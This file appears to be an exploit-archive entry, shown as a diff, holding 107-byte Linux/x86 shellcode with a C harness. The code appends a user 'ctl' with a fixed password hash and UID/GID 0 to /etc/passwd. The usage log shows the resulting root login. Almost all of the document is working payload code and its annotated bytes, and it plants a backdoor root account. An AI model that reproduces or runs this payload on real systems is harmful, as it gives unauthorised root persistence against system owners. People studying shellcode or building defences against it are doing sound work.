@@ -1,0 +1,69 @@
+id: 34326
+date: 04/27/2020
+title: Linux/x86 Add Root User Shellcode (107 bytes)
+author: Bobby Cooke
+cves: 
+
+// Shellcode Title:  Linux/x86 - Add Root User (107 bytes)
+// Shellcode Author: Bobby Cooke
+// Tested On: Ubuntu 3.13.0-32-generic #57~precise1-Ubuntu i386 
+// Description:      This shellcode adds the user 'ctl' with the password 'ctl' to the /etc/passwd file; with the UID & GID of 0 (root). This shellcode uses legacy passwd functionality. Therefor the /etc/shadow file does not need to be accessed or modified.
+// Usage:
+//   root# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+//   root# cat /etc/passwd | grep 0:0
+//   root:x:0:0:root:/root:/bin/bash
+//   root# ./shellcode 
+//   Shellcode Length:  107
+//   root# cat /etc/passwd | grep 0:0
+//   root:x:0:0:root:/root:/bin/bash
+//   ctl:NNwZ8D1QjVy3Y:0:0::/:/bin//sh
+//   root# exit
+//   exit
+//   user$ su ctl
+//   Password: 
+//   # id
+//   uid=0(root) gid=0(root) groups=0(root)
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char shellcode[] = \
+"\xeb\x27"     // jmp short jmp2call ; JMP CALL POP
+// string2stack:
+"\x5e"         // pop esi; ESI = &String= "/bin/sh#-c#/bin/echo.."
+"\x31\xc0"     // xor eax, eax 
+"\x50"         // push eax               ; null terminate "/bin//sh"
+"\x8d\x14\x24" // lea edx, [esp]         ; fill edx with pointer to null dword
+"\xff\x76\x2a" // push dword [esi +42]   ; push "//sh" onto the stack.
+"\xff\x76\x26" // push dword [esi +38]   ; push "/bin" onto the stack.
+"\x8d\x0c\x24" // lea ecx, [esp]         ; save for later for ebx
+"\x88\x46\x02" // mov byte [esi +2], al  ; Null byte to terminate string "-c"
+"\x88\x46\x3d" // mov byte [esi +61], al ; Null terminate "/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin/sh >> /etc/passwd#"
+"\x50"         // push eax               ; push to stack argv[] Null dword array terminator.
+"\x8d\x5e\x03" // lea ebx, [esi +3]      ; move pointer to string "/bin/echo..." into ebx register
+"\x53"         // push ebx               ; argv[] 3rd arg. Mem location to "/bin/echo.." string
+"\x8d\x1e"     // lea ebx, [esi]         ; move pointer to string "-c" into ebx register
+"\x53"         // push ebx               ; argv[] 2nd arg. Memory location of "-c" anfter first string,
+"\x89\xcb"     // mov ebx, ecx           ; memory address of "/bin//sh" on the stack
+"\x53"         // push ebx               ; argv[] array start. Memory pointer to string "/bin/sh"
+"\x89\xe1"     // mov ecx, esp           ; point ecx to top of stack
+"\xb0\x0b"     // mov al, 0xb            ; 11 - syscall for execve
+"\xcd\x80"     // int 0x80               ; executes execve systemcall
+// jmp2call:
+"\xe8\xd4\xff\xff\xff" //  call string2stack ; [ESP] = String
+// string:
+// "-c#/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin//sh >> /etc/passwd"
+"\x2d\x63\x23\x2f\x62\x69\x6e\x2f\x65\x63\x68\x6f\x20" // "-c#/bin/echo "
+"\x63\x74\x6c\x3a\x4e\x4e\x77\x5a\x38\x44\x31\x51\x6a" // "ctl:NNwZ8D1Qj"
+"\x56\x79\x33\x59\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f" // "Vy3Y:0:0::/:/"
+"\x62\x69\x6e\x2f\x2f\x73\x68\x20\x3e\x3e\x20\x2f\x65" // "bin//sh >> /e"
+"\x74\x63\x2f\x70\x61\x73\x73\x77\x64";                 // "tc/passwd"
+
+int main()
+{
+        printf("Shellcode Length:  %d\n", strlen(shellcode));
+        int (*ret)() = (int(*)())shellcode;
+        ret();
+}
+
+#  0day.today [2023-03-26]  #
